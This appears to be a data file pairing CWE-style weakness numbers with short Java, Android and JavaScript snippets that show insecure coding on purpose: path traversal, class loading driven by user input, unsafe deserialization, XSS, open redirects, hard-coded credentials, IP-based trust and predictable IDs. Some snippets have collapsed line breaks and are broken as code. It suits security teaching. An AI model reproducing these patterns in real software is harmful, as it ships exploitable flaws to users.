+ // update sales database for number of product sold with product ID public void updateSalesForProduct(String productID, int amountSold) {    // get the total number of products in inventory database int productCount = inventory.getProductCount(productID);
+ // convert integer values to short, the method for the   // sales object requires the parameters to be of type short short count = (short) productCount;
+short sold = (short) amountSold;
+ // update sales database for product sales.updateSalesCount(productID, count, sold);
+   }...
+
+369, public int computeAverageResponseTime (int totalTime, int numRequests) {   return totalTime / numRequests;
+ }
+369,null
+369,null
+681, int i = (int) 33457.8f;
+
+681,null
+681,null
+681,null
+1339,null
+1389,null
+1389,null
+1389,null
+766,null
+766,null
+767,null
+767, public class Client {   private int UID;
+public int PID;
+private String userName;
+public Client(String userName){     PID = getDefaultProfileID();
+UID = mapUserNametoUID( userName );
+this.userName = userName;
+  }public void setPID(int ID) {     UID = ID;
+  } }
+476,null
+476, String cmd = System.getProperty("cmd");
+cmd = cmd.trim();
+
+476, ...
+ IntentFilter filter = new IntentFilter("com.example.URLHandler.openURL");
+MyReceiver receiver = new MyReceiver();
+registerReceiver(receiver, filter);
+ ...
+  public class UrlHandlerReceiver extends BroadcastReceiver {      @Overridepublic void onReceive(Context context, Intent intent) {            if("com.example.URLHandler.openURL".equals(intent.getAction())) {           String URL = intent.getStringExtra("URLToOpen");
+int length = URL.length();
+       ...
+ }       }   }
+588,null
+763,null
+763,null
+763,null
+763,null
+825,null
+825,null
+250,null
+250,null
+250, locationClient = new LocationClient(this, this, this);
+locationClient.connect();
+Location userCurrLocation;
+userCurrLocation = locationClient.getLastLocation();
+setTimeZone(userCurrLocation);
+
+250,null
+250, locationClient = new LocationClient(this, this, this);
+locationClient.connect();
+Location userCurrLocation;
+userCurrLocation = locationClient.getLastLocation();
+deriveStateFromCoords(userCurrLocation);
+
+266,null
+266, AccessController.doPrivileged(new PrivilegedAction() {      public Object run() {   // privileged code goes here, for example: System.loadLibrary("awt");
+return null;
+ // nothing to return    }   
+266, Intent intent = new Intent();
+intent.setAction("com.example.BackupUserData");
+intent.setData(file_uri);
+intent.addFlags(FLAG_GRANT_READ_URI_PERMISSION);
+sendBroadcast(intent);
+
+267, public enum Roles {   ADMIN,USER,GUEST } public void printDebugInfo(User requestingUser){      if(isAuthenticated(requestingUser)){            switch(requestingUser.role){                  case GUEST:               System.out.println("You are not authorized to perform this command");
+break;
+        default:               System.out.println(currentDebugState());
+break;
+                  }       }else{       System.out.println("You must be logged in to perform this command");
+   }   }
+268, public enum Roles {   ADMIN,OPERATOR,USER,GUEST } public void resetPassword(User requestingUser, User user, String password ){      if(isAuthenticated(requestingUser)){            switch(requestingUser.role){                  case GUEST:               System.out.println("You are not authorized to perform this command");
+break;
+        case USER:               System.out.println("You are not authorized to perform this command");
+break;
+        default:               setPassword(user,password);
+break;
+       }           }        else{       System.out.println("You must be logged in to perform this command");
+   }   }
+272,null
+272, AccessController.doPrivileged(new PrivilegedAction() {      public Object run() {   // privileged code goes here, for example: System.loadLibrary("awt");
+return null;
+ // nothing to return    }   
+272,null
+273,null
+501, usrname = request.getParameter("usrname");
+if (session.getAttribute(ATTR_USR) == null) {   session.setAttribute(ATTR_USR, usrname);
+ }
+501,null
+580, public class Kibitzer {      public Object clone() throws CloneNotSupportedException {       Object returnMe = new Kibitzer();
+...
+       }   } public class FancyKibitzer extends Kibitzer{      public Object clone() throws CloneNotSupportedException {       Object returnMe = super.clone();
+...
+       }   }
+331,null
+331, String GenerateReceiptURL(String baseUrl) {   Random ranGen = new Random();
+ranGen.setSeed((new Date()).getTime());
+return(baseUrl + ranGen.nextInt(400000000) + ".html");
+ }
+334,null
+338, Random random = new Random(System.currentTimeMillis());
+int accountID = random.nextInt();
+
+338,null
+341,null
+412,null
+413,null
+413, public class BankAccount {    // variable for bank account balance private double accountBalance;
+  // constructor for BankAccount public BankAccount() {       accountBalance = 0;
+   }  // method to deposit amount into BankAccount public void deposit(double depositAmount) {       double newBalance = accountBalance + depositAmount;
+accountBalance = newBalance;
+       }  // method to withdraw amount from BankAccount public void withdraw(double withdrawAmount) {       double newBalance = accountBalance - withdrawAmount;
+accountBalance = newBalance;
+       }  // other methods for accessing the BankAccount object ...
+   }
+609, if (helper == null) {      synchronized (this) {       if (helper == null) {         helper = new Helper();
+    }   }   }return helper;
+
+609,null
+73, String rName = request.getParameter("reportName");
+File rFile = new File("/usr/local/apfr/reports/" + rName);
+...
+rFile.delete();
+
+73, fis = new FileInputStream(cfg.getProperty("sub")+".txt");
+amt = fis.read(arr);
+out.println(arr);
+
+410,null
+470, String ctl = request.getParameter("ctl");
+Class cmdClass = Class.forName(ctl + "Command");
+Worker ao = (Worker) cmdClass.newInstance();
+ao.doAction(request);
+
+470, String ctl = request.getParameter("ctl");
+Class cmdClass = Class.forName(ctl + "Command");
+Worker ao = (Worker) cmdClass.newInstance();
+ao.checkAccessControl(request);
+ao.doAction(request);
+
+502, try {   File file = new File("object.obj");
+ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
+javax.swing.JButton button = (javax.swing.JButton) in.readObject();
+in.close();
+ }
+502,null
+763,null
+763,null
+763,null
+763,null
+770,null
+770,null
+770,null
+770, public void acceptConnections() {      try {       ServerSocket serverSocket = new ServerSocket(SERVER_PORT);
+int counter = 0;
+boolean hasConnections = true;
+while (hasConnections) {         Socket client = serverSocket.accept();
+Thread t = new Thread(new ClientSocketThread(client));
+t.setName(client.getInetAddress().getHostName() + ":" + counter++);
+t.start();
+    }serverSocket.close();
+     } catch (IOException ex) {...
+}   }
+770,null
+908, private boolean initialized = true;
+public void someMethod() {      if (!initialized) {        // perform initialization tasks ...
+ initialized = true;
+       }   
+908,null
+908,null
+908,null
+909, private boolean initialized = true;
+public void someMethod() {      if (!initialized) {        // perform initialization tasks ...
+ initialized = true;
+       }   
+909,null
+909,null
+909,null
+914,null
+828,null
+828,null
+831,null
+831,null
+374,null
+374, public class BookStore {      private BookStoreInventory inventory;
+private SalesDBManager sales;
+...
+ // constructor for BookStore public BookStore() {       this.inventory = new BookStoreInventory();
+this.sales = new SalesDBManager();
+...
+   }public void updateSalesAndInventoryForBookSold(String bookISBN) {        // Get book object from inventory using ISBN Book book = inventory.getBookWithISBN(bookISBN);
+ // update sales information for book sold sales.updateSalesInformation(book);
+ // update inventory inventory.updateInventory(book);
+       } // other BookStore methods ...
+   }public class Book {   private String title;
+private String author;
+private String isbn;
+ // Book object constructors and get/set methods ...
+ }
+375, public class ClinicalTrial {   private PatientClass[] patientList = new PatientClass[50];
+public getPatients(...
+){     return patientList;
+  } }
+1265,null
+1265,null
+597, String str1 = new String("Hello");
+String str2 = new String("Hello");
+if (str1 == str2) {   System.out.println("str1 == str2");
+ }
+597,<p id="ieq3s1" type="text">(i === s1) is FALSE</p> <p id="s4eq3i" type="text">(s4 === i) is FALSE</p> <p id="s4eq3s1" type="text">(s4 === s1) is FALSE</p>  var i = 65;
+ var s1 = '65';
+ var s4 = new String('65');
+  if (i === s1) { document.getElementById("ieq3s1").innerHTML = "(i === s1) is TRUE";
+ }  if (s4 === i) { document.getElementById("s4eq3i").innerHTML = "(s4 === i) is TRUE";
+ }  if (s4 === s1) { document.getElementById("s4eq3s1").innerHTML = "(s4 === s1) is TRUE";
+ }
+597,null
+681, int i = (int) 33457.8f;
+
+681,null
+681,null
+681,null
+488, public class GuestBook extends HttpServlet {      String name;
+ protected void doPost (HttpServletRequest req, HttpServletResponse res) {       name = req.getParameter("name");
+...
+out.println(name + ", thanks for visiting!");
+   }   }
+613, <web-app>      [...
+snipped...
+] <session-config>       <session-timeout>-1</session-timeout>   </session-config>   </web-app>
+841,null
+1248,null
+1264,null
+1274,null
+1276,null
+441,null
+1220,null
+1222,null
+1242,null
+1260,null
+1262,null
+1267,null
+1268,null
+1280,null
+1259,null
+1270,null
+1290,null
+1292,null
+1299,null
+1302,null
+1314,null
+1209,null
+1231,null
+1233,null
+1234,null
+1245,null
+1254,null
+1261,null
+1252,null
+1281,null
+1342,null
+226,null
+226,null
+1342,null
+1257,null
+203,null
+203,null
+1300,null
+1300,null
+1240,null
+1279,null
+1247,null
+1248,null
+1255,null
+1255,null
+1256,null
+1271,null
+1304,null
+1314,null
+1320,null
+1332,null
+1191,null
+1234,null
+1243,null
+1244,null
+1258,null
+1291,null
+1323,null
+319, try {   URL u = new URL("http://www.secret.example.org/");
+HttpURLConnection hu = (HttpURLConnection) u.openConnection();
+hu.setRequestMethod("PUT");
+hu.connect();
+OutputStream os = hu.getOutputStream();
+hu.disconnect();
+ }catch (IOException e) { //...
+  }
+319,null
+1277,null
+1329,null
+1247,null
+1261,null
+1332,null
+1255,null
+1255,null
+1300,null
+1300,null
+1248,null
+1191,null
+1220,null
+1222,null
+1231,null
+1233,null
+1242,null
+1252,null
+1257,null
+1259,null
+1260,null
+1262,null
+1243,null
+1267,null
+1268,null
+1270,null
+1274,null
+1276,null
+1280,null
+1290,null
+1292,null
+1302,null
+1304,null
+1320,null
+1323,null
+269,null
+269,null
+269, AccessController.doPrivileged(new PrivilegedAction() {      public Object run() {   // privileged code goes here, for example: System.loadLibrary("awt");
+return null;
+ // nothing to return    }   
+269, public enum Roles {   ADMIN,USER,GUEST } public void printDebugInfo(User requestingUser){      if(isAuthenticated(requestingUser)){            switch(requestingUser.role){                  case GUEST:               System.out.println("You are not authorized to perform this command");
+break;
+        default:               System.out.println(currentDebugState());
+break;
+                  }       }else{       System.out.println("You must be logged in to perform this command");
+   }   }
+269, public enum Roles {   ADMIN,OPERATOR,USER,GUEST } public void resetPassword(User requestingUser, User user, String password ){      if(isAuthenticated(requestingUser)){            switch(requestingUser.role){                  case GUEST:               System.out.println("You are not authorized to perform this command");
+break;
+        case USER:               System.out.println("You are not authorized to perform this command");
+break;
+        default:               setPassword(user,password);
+break;
+       }           }        else{       System.out.println("You must be logged in to perform this command");
+   }   }
+250,null
+250,null
+250, locationClient = new LocationClient(this, this, this);
+locationClient.connect();
+Location userCurrLocation;
+userCurrLocation = locationClient.getLastLocation();
+setTimeZone(userCurrLocation);
+
+250,null
+250, locationClient = new LocationClient(this, this, this);
+locationClient.connect();
+Location userCurrLocation;
+userCurrLocation = locationClient.getLastLocation();
+deriveStateFromCoords(userCurrLocation);
+
+266,null
+266, AccessController.doPrivileged(new PrivilegedAction() {      public Object run() {   // privileged code goes here, for example: System.loadLibrary("awt");
+return null;
+ // nothing to return    }   
+266, Intent intent = new Intent();
+intent.setAction("com.example.BackupUserData");
+intent.setData(file_uri);
+intent.addFlags(FLAG_GRANT_READ_URI_PERMISSION);
+sendBroadcast(intent);
+
+1022,null
+1022, var newWindow = window.open("http://attacker-site.example.com/useful-page.html", "_blank");
+
+9,null
+267, public enum Roles {   ADMIN,USER,GUEST } public void printDebugInfo(User requestingUser){      if(isAuthenticated(requestingUser)){            switch(requestingUser.role){                  case GUEST:               System.out.println("You are not authorized to perform this command");
+break;
+        default:               System.out.println(currentDebugState());
+break;
+                  }       }else{       System.out.println("You must be logged in to perform this command");
+   }   }
+268, public enum Roles {   ADMIN,OPERATOR,USER,GUEST } public void resetPassword(User requestingUser, User user, String password ){      if(isAuthenticated(requestingUser)){            switch(requestingUser.role){                  case GUEST:               System.out.println("You are not authorized to perform this command");
+break;
+        case USER:               System.out.println("You are not authorized to perform this command");
+break;
+        default:               setPassword(user,password);
+break;
+       }           }        else{       System.out.println("You must be logged in to perform this command");
+   }   }
+271,null
+272,null
+272, AccessController.doPrivileged(new PrivilegedAction() {      public Object run() {   // privileged code goes here, for example: System.loadLibrary("awt");
+return null;
+ // nothing to return    }   
+272,null
+273,null
+283,null
+285,null
+285,null
+1256,null
+552,null
+433,null
+433,null
+732,null
+732,null
+732,null
+732,null
+1004, String sessionID = generateSessionId();
+Cookie c = new Cookie("session_id", sessionID);
+response.addCookie(c);
+
+862,null
+862,null
+1314,null
+863,null
+1244,null
+926,null
+926,null
+927, Intent intent = new Intent();
+intent.setAction("com.example.CreateUser");
+intent.putExtra("Username", uname_string);
+intent.putExtra("Password", pw_string);
+sendBroadcast(intent);
+
+927, Intent intent = new Intent();
+intent.setAction("com.example.service.UserExists");
+intent.putExtra("Username", uname_string);
+sendStickyBroadcast(intent);
+
+927, Intent intent = new Intent();
+intent.setAction("com.example.OpenURL");
+intent.putExtra("URL_TO_OPEN", url_string);
+sendOrderedBroadcastAsUser(intent);
+
+927, Intent intent = new Intent();
+intent.setAction("com.example.BackupUserData");
+intent.setData(file_uri);
+intent.addFlags(FLAG_GRANT_READ_URI_PERMISSION);
+sendBroadcast(intent);
+
+287,null
+258, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=...
+
+258,null
+798, ...
+DriverManager.getConnection(url, "scott", "tiger");
+...
+
+798,null
+798, int VerifyAdmin(String password) {   if (!password.equals("Mew!")) {     return(0)  }//Diagnostic Modereturn(1);
+ }
+798,null
+798, public boolean VerifyAdmin(String password) {   if (password.equals("68af404b513073584c4b6f22b6c63e6b")) {     System.out.println("Entering Diagnostic Mode...
+");
+return true;
+  }System.out.println("Incorrect Password!");
+return false;
+ 
+798,null
+798, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+798,null
+259, ...
+DriverManager.getConnection(url, "scott", "tiger");
+...
+
+259,null
+259, int VerifyAdmin(String password) {   if (!password.equals("Mew!")) {     return(0)  }//Diagnostic Modereturn(1);
+ }
+259, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+259,null
+321,null
+321, public boolean VerifyAdmin(String password) {   if (password.equals("68af404b513073584c4b6f22b6c63e6b")) {     System.out.println("Entering Diagnostic Mode...
+");
+return true;
+  }System.out.println("Incorrect Password!");
+return false;
+ 
+321,null
+290, String sourceIP = request.getRemoteAddr();
+if (sourceIP != null &amp;
+&amp;
+ sourceIP.equals(APPROVED_IP)) {   authenticated = true;
+ }
+290,null
+290, while(true) {      DatagramPacket rp=new DatagramPacket(rData,rData.length);
+outSock.receive(rp);
+String in = new String(p.getData(),0, rp.getLength());
+InetAddress clientIPAddress = rp.getAddress();
+int port = rp.getPort();
+ if (isTrustedAddress(clientIPAddress) &amp;
+ secretKey.equals(in)) {       out = secret.getBytes();
+DatagramPacket sp =new DatagramPacket(out,out.length, IPAddress, port);
+ outSock.send(sp);
+   }   }
+290,null
+290, String ip = request.getRemoteAddr();
+InetAddress addr = InetAddress.getByName(ip);
+if (addr.getCanonicalHostName().endsWith("trustme.com")) {   trusted = true;
+ }
+290,null
+291,null
+291, while(true) {      DatagramPacket rp=new DatagramPacket(rData,rData.length);
+outSock.receive(rp);
+String in = new String(p.getData(),0, rp.getLength());
+InetAddress clientIPAddress = rp.getAddress();
+int port = rp.getPort();
+ if (isTrustedAddress(clientIPAddress) &amp;
+ secretKey.equals(in)) {       out = secret.getBytes();
+DatagramPacket sp =new DatagramPacket(out,out.length, IPAddress, port);
+ outSock.send(sp);
+   }   }
+293,null
+293, boolean processConnectionRequest(HttpServletRequest request){   String referer = request.getHeader("referer")String trustedReferer = "http://www.example.com/"if(referer.equals(trustedReferer)){     openPrivilegedConnection(request);
+return true;
+  }else{     sendPrivilegeError(request);
+return false;
+  } }
+350,null
+350, String ip = request.getRemoteAddr();
+InetAddress addr = InetAddress.getByName(ip);
+if (addr.getCanonicalHostName().endsWith("trustme.com")) {   trusted = true;
+ }
+350,null
+350,null
+350, while(true) {      DatagramPacket rp=new DatagramPacket(rData,rData.length);
+outSock.receive(rp);
+String in = new String(p.getData(),0, rp.getLength());
+InetAddress IPAddress = rp.getAddress();
+int port = rp.getPort();
+if ((rp.getHostName()==...
+) &amp;
+ (in==...
+)) {       out = secret.getBytes();
+DatagramPacket sp =new DatagramPacket(out,out.length, IPAddress, port);
+outSock.send(sp);
+       }   }
+301,null
+301, String command = new String("some cmd to execute &amp;
+ the password") MessageDigest encer = MessageDigest.getInstance("SHA");
+encer.update(command.getBytes("UTF-8"));
+byte[] digest = encer.digest();
+
+302, boolean authenticated = new Boolean(getCookieValue("authenticated")).booleanValue();
+if (authenticated) {   ...
+ }
+307, String username = request.getParameter("username");
+String password = request.getParameter("password");
+ int authResult = authenticateUser(username, password);
+
+307,null
+307,null
+308,null
+308, String plainText = new String(plainTextIn);
+MessageDigest encer = MessageDigest.getInstance("SHA");
+encer.update(plainTextIn);
+byte[] digest = password.digest();
+ //Login if hash matches stored hash if (equal(digest,secret_password())) {   login_user();
+ }
+309,null
+309, String plainText = new String(plainTextIn);
+MessageDigest encer = MessageDigest.getInstance("SHA");
+encer.update(plainTextIn);
+byte[] digest = password.digest();
+ //Login if hash matches stored hash if (equal(digest,secret_password())) {   login_user();
+ }
+522,null
+522, ...
+Properties prop = new Properties();
+prop.load(new FileInputStream("config.properties"));
+String password = prop.getProperty("password");
+DriverManager.getConnection(url, usr, password);
+...
+
+522, ...
+String password = regKey.GetValue(passKey).toString();
+NetworkCredential netCred = new NetworkCredential(username,password,domain);
+...
+
+522,null
+522, int VerifyAdmin(String password) {   if (passwd.Equals(compress(password), compressed_password)) {     return(0);
+  } //Diagnostic Mode return(1);
+ }
+522, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+522,null
+256, ...
+Properties prop = new Properties();
+prop.load(new FileInputStream("config.properties"));
+String password = prop.getProperty("password");
+DriverManager.getConnection(url, usr, password);
+...
+
+256, ...
+String password = regKey.GetValue(passKey).toString();
+NetworkCredential netCred = new NetworkCredential(username,password,domain);
+...
+
+256, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+256,null
+257,null
+257, int VerifyAdmin(String password) {   if (passwd.Equals(compress(password), compressed_password)) {     return(0);
+  } //Diagnostic Mode return(1);
+ }
+257, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+257,null
+260, webapp.ldap.username = secretUsernamewebapp.ldap.password = secretPassword
+260, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+260,null
+13,null
+258, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=...
+
+258,null
+555, webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword
+261, ...
+Properties prop = new Properties();
+prop.load(new FileInputStream("config.properties"));
+String password = Base64.decode(prop.getProperty("password"));
+DriverManager.getConnection(url, usr, password);
+...
+
+261,null
+593,null
+620,null
+295,null
+295,null
+295,null
+295,null
+295,null
+296,null
+297,null
+298,null
+299,null
+370,null
+599,null
+306, public BankAccount createBankAccount(String accountNumber, String accountType,String accountName, String accountSSN, double balance) {      BankAccount account = new BankAccount();
+account.setAccountNumber(accountNumber);
+account.setAccountType(accountType);
+account.setAccountOwnerName(accountName);
+account.setAccountOwnerSSN(accountSSN);
+account.setBalance(balance);
+ return account;
+   }
+306,null
+1299,null
+346, IntentFilter filter = new IntentFilter("com.example.RemoveUser");
+MyReceiver receiver = new MyReceiver();
+registerReceiver(receiver, filter);
+ public class DeleteReceiver extends BroadcastReceiver {   @Overridepublic void onReceive(Context context, Intent intent) {     int userID = intent.getIntExtra("userID");
+destroyUserData(userID);
+  } }
+346,// Android @Overridepublic boolean shouldOverrideUrlLoading(WebView view, String url){      if (url.substring(0,14).equalsIgnoreCase("examplescheme:")){       if(url.substring(14,25).equalsIgnoreCase("getUserInfo")){         writeDataToView(view, UserData);
+return false;
+    }else{         return true;
+    }   }   }
+346,null
+749, public void removeDatabase(String databaseName) {      try {            Statement stmt = conn.createStatement();
+stmt.execute("DROP DATABASE " + databaseName);
+       } catch (SQLException ex) {...
+}   }
+749,// Android @Overridepublic boolean shouldOverrideUrlLoading(WebView view, String url){      if (url.substring(0,14).equalsIgnoreCase("examplescheme:")){       if(url.substring(14,25).equalsIgnoreCase("getUserInfo")){         writeDataToView(view, UserData);
+return false;
+    }else{         return true;
+    }   }   }
+749,null
+749, public class WebViewGUI extends Activity {      WebView mainWebView;
+ public void onCreate(Bundle savedInstanceState) {       super.onCreate(savedInstanceState);
+mainWebView = new WebView(this);
+mainWebView.getSettings().setJavaScriptEnabled(true);
+mainWebView.addJavascriptInterface(new JavaScriptInterface(), "userInfoObject");
+mainWebView.loadUrl("file:///android_asset/www/index.html");
+setContentView(mainWebView);
+   } final class JavaScriptInterface {            JavaScriptInterface () {} public String getUserInfo() {           return currentUser.Info();
+     }       }   }
+749, final class JavaScriptInterface {      JavaScriptInterface () { } @JavascriptInterfacepublic String getUserInfo() {       return currentUser.Info();
+   }   }
+1275,let sessionId = generateSessionId() let cookieOptions = { domain: 'example.com' } response.cookie('sessionid', sessionId, cookieOptions)
+291,null
+291, while(true) {      DatagramPacket rp=new DatagramPacket(rData,rData.length);
+outSock.receive(rp);
+String in = new String(p.getData(),0, rp.getLength());
+InetAddress clientIPAddress = rp.getAddress();
+int port = rp.getPort();
+ if (isTrustedAddress(clientIPAddress) &amp;
+ secretKey.equals(in)) {       out = secret.getBytes();
+DatagramPacket sp =new DatagramPacket(out,out.length, IPAddress, port);
+ outSock.send(sp);
+   }   }
+297,null
+300, Socket sock;
+PrintWriter out;
+ try {      sock = new Socket(REMOTE_HOST, REMOTE_PORT);
+out = new PrintWriter(echoSocket.getOutputStream(), true);
+  // Write data to remote host via socket output stream. ...
+   }
+1299,null
+940, IntentFilter filter = new IntentFilter("com.example.RemoveUser");
+MyReceiver receiver = new MyReceiver();
+registerReceiver(receiver, filter);
+ public class DeleteReceiver extends BroadcastReceiver {   @Overridepublic void onReceive(Context context, Intent intent) {     int userID = intent.getIntExtra("userID");
+destroyUserData(userID);
+  } }
+940,// Android @Overridepublic boolean shouldOverrideUrlLoading(WebView view, String url){      if (url.substring(0,14).equalsIgnoreCase("examplescheme:")){       if(url.substring(14,25).equalsIgnoreCase("getUserInfo")){         writeDataToView(view, UserData);
+return false;
+    }else{         return true;
+    }   }   }
+940,null
+925,null
+925, ...
+ IntentFilter filter = new IntentFilter(Intent.ACTION_SHUTDOWN);
+BroadcastReceiver sReceiver = new ShutDownReceiver();
+registerReceiver(sReceiver, filter);
+ ...
+  public class ShutdownReceiver extends BroadcastReceiver {   @Overridepublic void onReceive(final Context context, final Intent intent) {     mainActivity.saveLocalData();
+mainActivity.stopActivity();
+  } }
+941,null
+942,null
+942,null
+113, String author = request.getParameter(AUTHOR_PARAM);
+...
+Cookie cookie = new Cookie("author", author);
+cookie.setMaxAge(cookieExpiration);
+response.addCookie(cookie);
+
+786,null
+786,null
+786,null
+788,null
+788,null
+788,null
+788,null
+825,null
+825,null
+385,null
+1329,null
+1277,null
+223,null
+778,null
+778, if LoginUser(){    // Login successful RunProgram();
+  } else {    // Login unsuccessful LoginRetry();
+  }
+778,null
+224,null
+396,null
+397,null
+397,null
+400, class Worker implements Executor {      ...
+public void execute(Runnable r) {       try {           ...
+     }catch (InterruptedException ie) {            // postpone response Thread.currentThread().interrupt();
+           }       } public Worker(Channel ch, int nworkers) {       ...
+   } protected void activate() {       Runnable loop = new Runnable() {           public void run() {               try {                   for (;
+;
+) {                     Runnable r = ...
+;
+r.run();
+          }         }catch (InterruptedException ie) {                   ...
+         }               }           };
+new Thread(loop).start();
+       }   }
+400,null
+400,null
+400,null
+400, public void acceptConnections() {      try {       ServerSocket serverSocket = new ServerSocket(SERVER_PORT);
+int counter = 0;
+boolean hasConnections = true;
+while (hasConnections) {         Socket client = serverSocket.accept();
+Thread t = new Thread(new ClientSocketThread(client));
+t.setName(client.getInetAddress().getHostName() + ":" + counter++);
+t.start();
+    }serverSocket.close();
+     } catch (IOException ex) {...
+}   }
+1235, Long count = 0L;
+  for (long i = 0;
+ i < Integer.MAX_VALUE;
+ i++) {    count += i;
+   }
+770,null
+770,null
+770,null
+770, public void acceptConnections() {      try {       ServerSocket serverSocket = new ServerSocket(SERVER_PORT);
+int counter = 0;
+boolean hasConnections = true;
+while (hasConnections) {         Socket client = serverSocket.accept();
+Thread t = new Thread(new ClientSocketThread(client));
+t.setName(client.getInetAddress().getHostName() + ":" + counter++);
+t.start();
+    }serverSocket.close();
+     } catch (IOException ex) {...
+}   }
+770,null
+1325,null
+789,null
+789, unsigned int size = GetUntrustedInt();
+HashMap list = new HashMap(size);
+
+789,null
+789,null
+789,null
+789,null
+404, private void processFile(string fName){   BufferReader fil = new BufferReader(new FileReader(fName));
+String line;
+while ((line = fil.ReadLine()) != null){     processLine(line);
+  } }
+404, try {   Connection con = DriverManager.getConnection(some_connection_string);
+ }catch ( Exception e ) {   log( e );
+ }
+404,null
+404,null
+404,null
+404,null
+299,null
+370,null
+459, try {   InputStream is = new FileInputStream(path);
+byte b[] = new byte[is.available()];
+is.read(b);
+is.close();
+ } catch (Throwable t) {   log.error("Something bad happened: " + t.getMessage());
+ }
+226,null
+226,null
+1342,null
+460, public class foo {      public static final void main( String args[] ) {       boolean returnValue;
+returnValue=doStuff();
+       }public static final boolean doStuff( ) {       boolean threadLock;
+boolean truthvalue=true;
+try {           while( //check some condition ) {               threadLock=true;
+ //do some stuff to truthvaluethreadLock=false;
+               }           }catch (Exception e){           System.err.println("You did something bad");
+if (something) return truthvalue;
+           }return truthvalue;
+       }   }
+568, protected void finalize() {   discardNative();
+ }
+763,null
+763,null
+763,null
+763,null
+761,null
+761,null
+761,null
+590,null
+590,null
+405,null
+405,null
+405,var test_string = "Bad characters: $@#";
+ var bad_pattern = /^(\w+\s?)*$/i;
+ var result = test_string.search(bad_pattern);
+
+406,null
+407,var test_string = "Bad characters: $@#";
+ var bad_pattern = /^(\w+\s?)*$/i;
+ var result = test_string.search(bad_pattern);
+
+1333,var test_string = "Bad characters: $@#";
+ var bad_pattern = /^(\w+\s?)*$/i;
+ var result = test_string.search(bad_pattern);
+
+1333,null
+408,null
+410,null
+471, String[] colors = car.getAllPossibleColors();
+colors[0] = "Red";
+
+291,null
+291, while(true) {      DatagramPacket rp=new DatagramPacket(rData,rData.length);
+outSock.receive(rp);
+String in = new String(p.getData(),0, rp.getLength());
+InetAddress clientIPAddress = rp.getAddress();
+int port = rp.getPort();
+ if (isTrustedAddress(clientIPAddress) &amp;
+ secretKey.equals(in)) {       out = secret.getBytes();
+DatagramPacket sp =new DatagramPacket(out,out.length, IPAddress, port);
+ outSock.send(sp);
+   }   }
+472, String accountID = request.getParameter("accountID");
+User user = getUserFromID(Long.parseLong(accountID));
+
+472,null
+607, public static final String[] USER_ROLES;
+
+487, package math;
+public class Lebesgue implements Integration{      public final Static String youAreHidingThisFunction(functionToIntegrate){       return ...
+;
+       }   }
+495, private String[] colors;
+public String[] getColors() {   return colors;
+ }
+495,null
+496, private String[] userRoles;
+public void setUserRoles(String[] userRoles) {   this.userRoles = userRoles;
+ }
+501, usrname = request.getParameter("usrname");
+if (session.getAttribute(ATTR_USR) == null) {   session.setAttribute(ATTR_USR, usrname);
+ }
+501,null
+580, public class Kibitzer {      public Object clone() throws CloneNotSupportedException {       Object returnMe = new Kibitzer();
+...
+       }   } public class FancyKibitzer extends Kibitzer{      public Object clone() throws CloneNotSupportedException {       Object returnMe = super.clone();
+...
+       }   }
+384, private void auth(LoginContext lc, HttpSession session) throws LoginException {   ...
+lc.login();
+...
+ }
+384,null
+441,null
+470, String ctl = request.getParameter("ctl");
+Class cmdClass = Class.forName(ctl + "Command");
+Worker ao = (Worker) cmdClass.newInstance();
+ao.doAction(request);
+
+470, String ctl = request.getParameter("ctl");
+Class cmdClass = Class.forName(ctl + "Command");
+Worker ao = (Worker) cmdClass.newInstance();
+ao.checkAccessControl(request);
+ao.doAction(request);
+
+601,null
+601, public class RedirectServlet extends HttpServlet {      protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {       String query = request.getQueryString();
+if (query.contains("url")) {         String url = request.getParameter("url");
+response.sendRedirect(url);
+    }   }   }
+73, String rName = request.getParameter("reportName");
+File rFile = new File("/usr/local/apfr/reports/" + rName);
+...
+rFile.delete();
+
+73, fis = new FileInputStream(cfg.getProperty("sub")+".txt");
+amt = fis.read(arr);
+out.println(arr);
+
+114, ...
+System.loadLibrary("library.dll");
+...
+
+114,null
+114,null
+667, private long someLongValue;
+public long getLongValue() {   return someLongValue;
+ } public void setLongValue(long l) {   someLongValue = l;
+ }
+667,null
+667,null
+667, if (helper == null) {      synchronized (this) {       if (helper == null) {         helper = new Helper();
+    }   }   }return helper;
+
+667,null
+1233,null
+1234,null
+412,null
+413,null
+413, public class BankAccount {    // variable for bank account balance private double accountBalance;
+  // constructor for BankAccount public BankAccount() {       accountBalance = 0;
+   }  // method to deposit amount into BankAccount public void deposit(double depositAmount) {       double newBalance = accountBalance + depositAmount;
+accountBalance = newBalance;
+       }  // method to withdraw amount from BankAccount public void withdraw(double withdrawAmount) {       double newBalance = accountBalance - withdrawAmount;
+accountBalance = newBalance;
+       }  // other methods for accessing the BankAccount object ...
+   }
+609, if (helper == null) {      synchronized (this) {       if (helper == null) {         helper = new Helper();
+    }   }   }return helper;
+
+609,null
+820,null
+543, private static NumberConverter singleton;
+public static NumberConverter get_singleton() {   if (singleton == null) {     singleton = new NumberConverter();
+  }return singleton;
+ }
+567, public static class Counter extends HttpServlet {   static int count = 0;
+protected void doGet(HttpServletRequest in, HttpServletResponse out)throws ServletException, IOException {     out.setContentType("text/plain");
+PrintWriter p = out.getWriter();
+count++;
+p.println(count + " hits so far!");
+  } }
+1264,null
+572, Thread thr = new Thread() {   public void run() {     ...
+  } };
+ thr.run();
+
+574, @Entitypublic class Customer implements Serializable {      private String id;
+private String firstName;
+private String lastName;
+private Address address;
+ public Customer() {...
+} public Customer(String id, String firstName, String lastName) {...
+} @Idpublic String getCustomerId() {...
+} public synchronized void setCustomerId(String id) {...
+} public String getFirstName() {...
